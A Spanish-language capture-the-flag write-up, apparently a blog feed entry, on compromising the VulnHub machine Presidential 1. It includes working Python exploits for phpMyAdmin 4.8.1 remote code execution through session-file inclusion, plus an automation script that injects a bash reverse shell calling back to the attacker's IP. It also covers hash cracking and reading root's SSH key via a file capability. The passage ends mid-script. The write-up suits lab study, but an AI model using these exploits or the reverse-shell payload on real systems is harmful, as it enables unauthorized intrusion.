@@ -1,0 +1,343 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-11-15T11:21:51-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pwn3t | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad y CTFs</subtitle><author><name>Kysk3</name></author><entry><title type="html">Presidential 1 - VulnHub</title><link href="http://localhost:4000/presidential/" rel="alternate" type="text/html" title="Presidential 1 - VulnHub" /><published>2025-11-12T00:00:00-05:00</published><updated>2025-11-12T00:00:00-05:00</updated><id>http://localhost:4000/presidential</id><content type="html" xml:base="http://localhost:4000/presidential/"><![CDATA[<p align="center">
+<img src="/assets/images/vulnHub/presidential_1/casablanca.jpg" />
+</p>
+
+<h2 id="information">Information</h2>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">os</code>: Linux</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Difficulty</code>: Medium</p>
+  </li>
+</ul>
+
+<hr />
+
+<p>Presidential es una máquina ideal para empezar: toca temas básicos de pentesting y te obliga a practicar la enumeración web. Repasas conceptos como virtual hosting y aprendes a encontrar vulnerabilidades aprovechando versiones antiguas de servicios. Además muestra cómo las malas prácticas de los usuarios <strong>por ejemplo la reutilización de credenciales</strong> nos permiten escalar privilegios. Al final se ve claramente que una mala gestión de privilegios puede causar problemas serios.</p>
+
+<h2 id="informe-técnico">Informe Técnico</h2>
+
+<ul>
+  <li><a href="../documentos/Presidential_1.pdf">Ver documento PDF</a></li>
+</ul>
+
+<hr />
+
+<h2 id="resumen">Resumen</h2>
+
+<ul>
+  <li>Encuentra un archivo con credenciales validas</li>
+  <li>Descubrimiento de virtual hosting</li>
+  <li>Explotación de phpMyAdmin</li>
+  <li>Abuso de Capabilities</li>
+</ul>
+
+<hr />
+
+<h1 id="reconociento">Reconociento</h1>
+
+<p>En el escaneo por nmap se muestran abierto el puerto 80 y 2082.</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">18.47</span>
+<span class="nc">Host</span> <span class="n">is</span> <span class="nf">up</span> <span class="o">(</span><span class="mf">0.00053</span><span class="n">s</span> <span class="n">latency</span><span class="o">).</span>
+
+<span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="n">open</span>  <span class="n">http</span>    <span class="nc">Apache</span> <span class="n">httpd</span> <span class="mf">2.4</span><span class="o">.</span><span class="mi">6</span> <span class="o">((</span><span class="nc">CentOS</span><span class="o">)</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">5.5</span><span class="o">.</span><span class="mi">38</span><span class="o">)</span>
+<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="nl">methods:</span> 
+<span class="o">|</span><span class="n">_</span>  <span class="nc">Potentially</span> <span class="n">risky</span> <span class="nl">methods:</span> <span class="no">TRACE</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="nl">title:</span> <span class="nc">Ontario</span> <span class="nc">Election</span> <span class="nc">Services</span> <span class="o">&amp;</span><span class="n">raquo</span><span class="o">;</span> <span class="nc">Vote</span> <span class="nc">Now</span><span class="o">!</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="nl">header:</span> <span class="nc">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="o">.</span><span class="mi">6</span> <span class="o">(</span><span class="nc">CentOS</span><span class="o">)</span> <span class="no">PHP</span><span class="o">/</span><span class="mf">5.5</span><span class="o">.</span><span class="mi">38</span>
+<span class="mi">2082</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">ssh</span>     <span class="nc">OpenSSH</span> <span class="mf">7.4</span> <span class="o">(</span><span class="n">protocol</span> <span class="mf">2.0</span><span class="o">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="nl">hostkey:</span> 
+<span class="o">|</span>   <span class="mi">2048</span> <span class="mo">06</span><span class="o">:</span><span class="mi">40</span><span class="o">:</span><span class="nl">f4:e5:</span><span class="mi">8</span><span class="nl">c:ad:</span><span class="mi">1</span><span class="nl">a:e6:</span><span class="mi">86</span><span class="o">:</span><span class="nl">de:a5:</span><span class="mi">75</span><span class="o">:</span><span class="nl">d0:a2:ac:</span><span class="mi">80</span> <span class="o">(</span><span class="no">RSA</span><span class="o">)</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="nl">e9:e6:</span><span class="mi">3</span><span class="nl">a:</span><span class="mi">83</span><span class="o">:</span><span class="mi">8</span><span class="nl">e:</span><span class="mi">94</span><span class="o">:</span><span class="nl">f2:</span><span class="mi">98</span><span class="o">:</span><span class="nl">dd:</span><span class="mi">3</span><span class="nl">e:</span><span class="mi">70</span><span class="o">:</span><span class="nl">fb:b9:a3:e3:</span><span class="mi">99</span> <span class="o">(</span><span class="no">ECDSA</span><span class="o">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">66</span><span class="o">:</span><span class="nl">a8:a1:</span><span class="mi">9</span><span class="nl">f:db:d5:ec:</span><span class="mi">4</span><span class="nl">c:</span><span class="mi">0</span><span class="nl">a:</span><span class="mi">9</span><span class="nl">c:</span><span class="mi">4</span><span class="nl">d:</span><span class="mi">53</span><span class="o">:</span><span class="mi">15</span><span class="o">:</span><span class="mi">6</span><span class="nl">c:</span><span class="mi">43</span><span class="o">:</span><span class="mi">6</span><span class="n">c</span> <span class="o">(</span><span class="no">ED25519</span><span class="o">)</span>
+</code></pre></div></div>
+<p>Realizando un reconociento de las tecnologias que se encuentran en la pagina web con la herramienta whatweb se descubre el nombre del dominio <strong>votenow.local</strong>.</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/whatweb.png" alt="" /></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Teniendo el nombre del dominio <strong>votenow.local</strong>, usaremos <code class="language-plaintext highlighter-rouge">gobuster vhost</code> para buscar posibles subdominios.</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/subdomain.png" alt="" /></p>
+
+<p>Se identifico el subdominio <strong>datasafe.votenow.local</strong>, ponemos este nombre de dominio y el subdominio en el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/virtualhosting.png" alt="" /></p>
+
+<p>Al ingresar a <code class="language-plaintext highlighter-rouge">http://datasafe.votenow.local</code> nos encontramos con un panel de autenticacion de <strong>PhpMyAdmin</strong>.</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/PhpMyAdmin.png" alt="" /></p>
+
+<h2 id="explotación">Explotación</h2>
+
+<p>Como no se puede avanzar mas sin las credenciales del PhpMyAdmin, realizamos fuzzing con <strong>gobuster</strong> a la pagina principal para encontrar archivos o ficheros interesantes. 
+<img src="/assets/images/vulnHub/presidential_1/backup.png" alt="" /></p>
+
+<p>Logramos encontrar un archivo <strong>config.php.bak</strong> que contenia credenciales validas.</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/credentials.png" alt="" /></p>
+
+<p>Usando las credenciales encontradas en el archivo <strong>config.php.bak</strong> logramos autenticarnos al PhpMyAdmin.</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/phpmyadmindentro.png" alt="" /></p>
+
+<p>Una vez ingresado al PhpMyAdmin, fue posible identificar la versión actualmente en uso:</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/versionphpmyadmin.png" alt="" /></p>
+
+<p>La version <strong>4.8.1</strong> de PhpMyAdmin es vulneravle a <code class="language-plaintext highlighter-rouge">RCE</code>.</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/searchsploit.png" alt="" /></p>
+
+<p>Script en Python3 para ejecutar código remoto en el servidor.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">import</span> <span class="nn">re</span><span class="p">,</span> <span class="n">requests</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">html</span>
+
+<span class="k">def</span> <span class="nf">get_token</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+  <span class="n">s</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'token"\s*value="(.*?)"'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+  <span class="n">token</span> <span class="o">=</span> <span class="n">html</span><span class="p">.</span><span class="n">unescape</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+  <span class="k">return</span> <span class="n">token</span>
+
+<span class="n">ipaddr</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">path</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+<span class="n">username</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+<span class="n">password</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span>
+<span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://{}:{}{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ipaddr</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">path</span><span class="p">)</span>
+
+<span class="n">url1</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/index.php"</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url1</span><span class="p">)</span>
+<span class="n">content</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'PMA_VERSION:"(\d+\.\d+\.\d+)"'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+<span class="n">version</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">cookies</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">cookies</span>
+<span class="n">token</span> <span class="o">=</span> <span class="n">get_token</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="p">{</span><span class="s">'token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">'pma_username'</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s">'pma_password'</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url1</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">)</span>
+<span class="n">content</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'logged_in:(\w+),'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+<span class="n">logged_in</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">cookies</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">cookies</span>
+<span class="n">token</span> <span class="o">=</span> <span class="n">get_token</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="n">url2</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/import.php"</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'''select '&lt;?php system("{}") ?&gt;';'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="p">{</span><span class="s">'table'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span> <span class="s">'token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">'sql_query'</span><span class="p">:</span> <span class="n">payload</span> <span class="p">}</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url2</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">)</span>
+
+<span class="n">session_id</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s">'phpMyAdmin'</span><span class="p">]</span>
+<span class="n">url3</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url3</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
+
+<span class="n">content</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">"replace"</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"select '(.*?)</span><span class="se">\n</span><span class="s">'"</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">s</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
+  <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Le pasamos los parametros necesarios al script y ganamos acceso a la maquina como el usuario <strong>apache</strong>.</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/rce.png" alt="" /></p>
+
+<p>Mirando en el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la maquina victima, podemor ver que existe un usuario llamado <strong>admin</strong>.</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/user_passwd.png" alt="" /></p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>En la base de datos de PhpMyAdmin encontramos las credenciales del usuario admin, pero su contraseña esta hasheada.</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/phpMyAdmin_credentials.png" alt="" /></p>
+
+<p>Utilizamos la herramienta <code class="language-plaintext highlighter-rouge">John</code> para realizar fuerza bruta con el diccionario rockyou.txt</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/credentials_admin.png" alt="" /></p>
+
+<p>Al probar la contraseña <strong>Stella</strong> nos pudimos autenticar en el sistema, lo que confirma que hay reutilización de credenciales.</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/user_pivoting.png" alt="" /></p>
+
+<p>Analizando de forma recursiva las Capabilities del sistema, encontramos que el binario <code class="language-plaintext highlighter-rouge">tarS</code> tiene la capacidad <code class="language-plaintext highlighter-rouge">cap dac read search+ep</code></p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/capabilities.png" alt="" /></p>
+
+<p>Esta capacidad permite que dicho binario omita las comprobaciones de permisos de lectura sobre archivos y directorios.
+En este caso como tiene habilitado el SSH nos intereza obtener la <code class="language-plaintext highlighter-rouge">id_rsa</code> del usuario root.</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/tarS.png" alt="" /></p>
+
+<p>Teniendo la <code class="language-plaintext highlighter-rouge">id_rsa</code> podemos obtener una shell como el usuario root</p>
+
+<p><img src="/assets/images/vulnHub/presidential_1/root.png" alt="" /></p>
+
+<hr />
+
+<h2 id="autopwn">AutoPwn</h2>
+
+<p>Script en Python3</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1"># Author: Kysk3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">signal</span><span class="p">,</span> <span class="n">threading</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">pdb</span> 
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span>
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
+
+<span class="c1">#Compronar parametros
+</span><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="se">\n</span><span class="s">Uso: python3 </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;ip-target&gt; &lt;tu-ip&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'green'</span><span class="p">))</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">ip_target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">ip_attack</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+<span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Iniciando reconocimiento"</span><span class="p">)</span>
+
+<span class="c1"># comprobar privilegios
+</span><span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">colored</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Este script necesita permisos de superusuario. Ejecuta con sudo.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">'red'</span><span class="p">))</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">virtual_host</span><span class="p">():</span>
+
+    <span class="n">p1</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Agregando dominios al /etc/hosts"</span><span class="p">)</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/etc/hosts"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">ip_target</span><span class="si">}</span><span class="s"> votenow.local datasafe.votenow.local"</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">credentials_db</span><span class="p">():</span>
+    
+    <span class="k">global</span> <span class="n">db_user</span><span class="p">,</span> <span class="n">db_passwd</span>
+    
+    <span class="n">p1</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Obteniendo credenciales"</span><span class="p">)</span>
+
+    <span class="n">url_credentials</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ip_target</span><span class="si">}</span><span class="s">/config.php.bak"</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_credentials</span><span class="p">)</span>
+    <span class="n">db_user</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'dbUser = "(.*?)"'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">db_passwd</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'dbPass = "(.*?)"'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">session_PhpPyAdmin</span><span class="p">():</span>
+    
+    <span class="n">p2</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Iniciando Ataque en PhpMyAdmin"</span><span class="p">)</span>
+    <span class="n">p2</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Autenticación en PhpMyAdmin"</span><span class="p">)</span>
+
+    <span class="n">url_PhpMyAdmin</span> <span class="o">=</span> <span class="s">"http://datasafe.votenow.local/index.php"</span>
+
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_PhpMyAdmin</span><span class="p">)</span>
+
+    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s">'set_session'</span><span class="p">:</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'name="set_session" value="(.*?)"'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span>
+            <span class="s">'pma_username'</span><span class="p">:</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">db_user</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+            <span class="s">'pma_password'</span><span class="p">:</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">db_passwd</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+            <span class="s">'server'</span><span class="p">:</span> <span class="s">'1'</span><span class="p">,</span>
+            <span class="s">'target'</span><span class="p">:</span> <span class="s">'index.php'</span><span class="p">,</span>
+            <span class="s">'token'</span><span class="p">:</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'name="token" value="(.*?)"'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+            <span class="p">}</span>
+    
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_PhpMyAdmin</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+    
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+
+    <span class="n">cookies</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">cookies</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'name="token" value="(.*?)"'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>
+    
+    <span class="c1">#Creando el payload
+</span>    <span class="n">p2</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Creando payload"</span><span class="p">)</span>
+
+    <span class="n">command</span> <span class="o">=</span> <span class="s">"bash -c 'bash -i &gt;&amp; /dev/tcp/{}/443 0&gt;&amp;1'"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip_attack</span><span class="p">)</span>
+    <span class="n">url_shell</span> <span class="o">=</span> <span class="s">"http://datasafe.votenow.local/import.php"</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">'''select '&lt;?php system("{}"); ?&gt;';'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+
+    <span class="n">p</span> <span class="o">=</span> <span class="p">{</span><span class="s">'table'</span><span class="p">:</span><span class="s">''</span><span class="p">,</span> <span class="s">'token'</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">'sql_query'</span><span class="p">:</span> <span class="n">payload</span> <span class="p">}</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_shell</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Query failed"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+    <span class="c1">## LFI -&gt; RCE
+</span>    <span class="n">p2</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"LFI -&gt; RCE"</span><span class="p">)</span>
+
+    <span class="n">session_id</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s">'phpMyAdmin'</span><span class="p">]</span>
+    <span class="n">url_lfi</span> <span class="o">=</span> <span class="s">"http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">session_id</span><span class="p">)</span>
+    
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_lfi</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Exploit failed"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+
+    <span class="n">virtual_host</span><span class="p">()</span>
+    <span class="n">credentials_db</span><span class="p">()</span>
